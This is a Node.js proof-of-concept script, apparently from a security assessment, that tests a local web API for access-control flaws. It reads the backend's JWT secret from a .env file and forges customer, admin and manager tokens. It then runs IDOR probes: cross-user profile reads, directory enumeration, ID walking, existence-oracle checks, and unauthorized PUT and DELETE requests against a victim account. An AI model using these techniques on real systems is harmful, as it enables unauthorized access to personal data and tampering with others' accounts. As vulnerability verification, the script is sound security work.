const fs = require('fs');
const path = require('path');
const http = require('http');
const dotenv = require(path.join(__dirname, '../backend/node_modules/dotenv'));

dotenv.config({ path: path.join(__dirname, '../backend/.env') });

// Require jsonwebtoken from backend
const jwt = require(path.join(__dirname, '../backend/node_modules/jsonwebtoken'));

function makeRequest(options, postData = null) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: data,
        });
      });
    });
    req.on('error', (err) => reject(err));
    if (postData) {
      req.write(typeof postData === 'string' ? postData : JSON.stringify(postData));
    }
    req.end();
  });
}

function formatRawHttp(title, options, res) {
  let output = `======================================================================\n`;
  output += `${title}\n`;
  output += `======================================================================\n`;
  output += `${options.method || 'GET'} ${options.path} HTTP/1.1\n`;
  output += `Host: ${options.host}:${options.port}\n`;
  if (options.headers) {
    for (const [k, v] of Object.entries(options.headers)) {
      output += `${k}: ${v}\n`;
    }
  }
  output += `\nHTTP/1.1 ${res.statusCode}\n`;
  for (const [k, v] of Object.entries(res.headers)) {
    output += `${k}: ${v}\n`;
  }
  output += `\n`;
  try {
    const parsed = JSON.parse(res.body);
    output += JSON.stringify(parsed, null, 2);
  } catch {
    output += res.body;
  }
  output += `\n\n`;
  return output;
}

async function run() {
  const jwtSecret = process.env.JWT_SECRET;
  if (!jwtSecret) {
    throw new Error('JWT_SECRET not found in .env');
  }

  // Verified existing users in the database
  const customerId = '6ab6b1257d5969e6fb3bfb31'; // attacker@example.com (customer)
  const victimId = '6ab694c69260aa809be76296';   // v15_victim@example.com (customer)
  const managerId = '68246b5359cae8f0a85eb7e6';  // ruwa@gmail.com (manager)
  const adminId = '6ab6ab3c1b313e5eb70d535c';    // v03_v04_test_admin@test.com (admin)

  const customerToken = jwt.sign({ id: customerId, role: 'customer' }, jwtSecret, { expiresIn: '1h' });
  const adminToken = jwt.sign({ id: adminId, role: 'admin' }, jwtSecret, { expiresIn: '1h' });
  const managerToken = jwt.sign({ id: managerId, role: 'manager' }, jwtSecret, { expiresIn: '1h' });

  const port = process.env.PORT || 5000;
  const host = 'localhost';

  console.log('--- Running Actor A (Unauthenticated) Probes ---');
  let unauthLog = '';
  // 1. GET /api/users
  const unauthDirOpts = { host, port, path: '/api/users', method: 'GET' };
  const unauthDirRes = await makeRequest(unauthDirOpts);
  unauthLog += formatRawHttp('Probe 1: Unauthenticated GET /api/users', unauthDirOpts, unauthDirRes);

  // 2. GET /api/users/:userId
  const unauthProfOpts = { host, port, path: `/api/users/${customerId}`, method: 'GET' };
  const unauthProfRes = await makeRequest(unauthProfOpts);
  unauthLog += formatRawHttp('Probe 2: Unauthenticated GET /api/users/:userId', unauthProfOpts, unauthProfRes);

  fs.writeFileSync(path.join(__dirname, 'v10_unauth.txt'), unauthLog);
  console.log('Saved poc/v10_unauth.txt');

  console.log('--- Running Actor B (Authenticated Customer) Probes ---');
  let custLog = '';
  // 1. Directory enumeration by customer
  const custDirOpts = {
    host,
    port,
    path: '/api/users',
    method: 'GET',
    headers: { Authorization: `Bearer ${customerToken}` },
  };
  const custDirRes = await makeRequest(custDirOpts);
  custLog += formatRawHttp('Probe 1: Customer GET /api/users (Directory Exfiltration)', custDirOpts, custDirRes);

  // 2. Cross-user profile access (Victim Customer)
  const custVictimOpts = {
    host,
    port,
    path: `/api/users/${victimId}`,
    method: 'GET',
    headers: { Authorization: `Bearer ${customerToken}` },
  };
  const custVictimRes = await makeRequest(custVictimOpts);
  custLog += formatRawHttp('Probe 2: Customer GET /api/users/:victimId (IDOR Horizontal Escalation)', custVictimOpts, custVictimRes);

  // 3. Cross-user profile access (Admin User)
  const custAdminOpts = {
    host,
    port,
    path: `/api/users/${adminId}`,
    method: 'GET',
    headers: { Authorization: `Bearer ${customerToken}` },
  };
  const custAdminRes = await makeRequest(custAdminOpts);
  custLog += formatRawHttp('Probe 3: Customer GET /api/users/:adminId (IDOR Vertical Escalation)', custAdminOpts, custAdminRes);

  // 4. Self profile access
  const custSelfOpts = {
    host,
    port,
    path: `/api/users/${customerId}`,
    method: 'GET',
    headers: { Authorization: `Bearer ${customerToken}` },
  };
  const custSelfRes = await makeRequest(custSelfOpts);
  custLog += formatRawHttp('Probe 4: Customer GET /api/users/:selfId (Self Access)', custSelfOpts, custSelfRes);

  fs.writeFileSync(path.join(__dirname, 'v10_customer.txt'), custLog);
  console.log('Saved poc/v10_customer.txt');

  console.log('--- Running Actor C (Authenticated Admin / Manager) Probes ---');
  let adminLog = '';
  // 1. Admin Directory access
  const adminDirOpts = {
    host,
    port,
    path: '/api/users',
    method: 'GET',
    headers: { Authorization: `Bearer ${adminToken}` },
  };
  const adminDirRes = await makeRequest(adminDirOpts);
  adminLog += formatRawHttp('Probe 1: Admin GET /api/users (Directory Access)', adminDirOpts, adminDirRes);

  // 2. Admin read any profile
  const adminProfOpts = {
    host,
    port,
    path: `/api/users/${victimId}`,
    method: 'GET',
    headers: { Authorization: `Bearer ${adminToken}` },
  };
  const adminProfRes = await makeRequest(adminProfOpts);
  adminLog += formatRawHttp('Probe 2: Admin GET /api/users/:anyId (Victim Profile Read)', adminProfOpts, adminProfRes);

  // 3. Manager Directory access
  const mgrDirOpts = {
    host,
    port,
    path: '/api/users',
    method: 'GET',
    headers: { Authorization: `Bearer ${managerToken}` },
  };
  const mgrDirRes = await makeRequest(mgrDirOpts);
  adminLog += formatRawHttp('Probe 3: Manager GET /api/users (Directory Access)', mgrDirOpts, mgrDirRes);

  fs.writeFileSync(path.join(__dirname, 'v10_admin.txt'), adminLog);
  console.log('Saved poc/v10_admin.txt');

  console.log('--- Running Enumeration / IDOR & Differential Response Probes ---');
  let enumLog = '';
  // 1. ID walking
  const allTestUsers = [customerId, victimId, managerId, adminId];
  enumLog += `Probe 1: ID Walking by Customer across 4 targets:\n`;
  for (const tid of allTestUsers) {
    const walkOpts = {
      host,
      port,
      path: `/api/users/${tid}`,
      method: 'GET',
      headers: { Authorization: `Bearer ${customerToken}` },
    };
    const walkRes = await makeRequest(walkOpts);
    enumLog += `Target ID: ${tid} -> Status: ${walkRes.statusCode} Body length: ${walkRes.body.length} bytes\n`;
  }
  enumLog += '\n';

  // 2. Invalid ObjectId handling
  const invalidIdOpts = {
    host,
    port,
    path: '/api/users/not-an-objectid',
    method: 'GET',
    headers: { Authorization: `Bearer ${customerToken}` },
  };
  const invalidIdRes = await makeRequest(invalidIdOpts);
  enumLog += formatRawHttp('Probe 2: Malformed ObjectId (CastError check)', invalidIdOpts, invalidIdRes);

  // 3. Nonexistent ObjectId handling (existence oracle check)
  const nonExistentIdOpts = {
    host,
    port,
    path: '/api/users/60c72b2f9b1d8b2bad888888',
    method: 'GET',
    headers: { Authorization: `Bearer ${customerToken}` },
  };
  const nonExistentIdRes = await makeRequest(nonExistentIdOpts);
  enumLog += formatRawHttp('Probe 3: Nonexistent ObjectId (Existence Oracle check)', nonExistentIdOpts, nonExistentIdRes);

  // 4. Unauthorized PUT on /api/users/:userId (should be 403 or 400, but route doesn't exist so 404 or matches something else)
  const putOtherOpts = {
    host,
    port,
    path: `/api/users/${victimId}`,
    method: 'PUT',
    headers: {
      Authorization: `Bearer ${customerToken}`,
      'Content-Type': 'application/json',
    },
  };
  const putOtherRes = await makeRequest(putOtherOpts, { name: 'Hacked Name' });
  enumLog += formatRawHttp('Probe 4: Customer PUT /api/users/:victimId', putOtherOpts, putOtherRes);

  // 5. Unauthorized DELETE on /api/users/:userId
  const delOtherOpts = {
    host,
    port,
    path: `/api/users/${victimId}`,
    method: 'DELETE',
    headers: { Authorization: `Bearer ${customerToken}` },
  };
  const delOtherRes = await makeRequest(delOtherOpts);
  enumLog += formatRawHttp('Probe 5: Customer DELETE /api/users/:victimId', delOtherOpts, delOtherRes);

  fs.writeFileSync(path.join(__dirname, 'v10_enumeration.txt'), enumLog);
  console.log('Saved poc/v10_enumeration.txt');

  console.log('Finished PoC reproduction successfully.');
}

run().catch((err) => {
  console.error('PoC Execution Error:', err);
  process.exit(1);
});
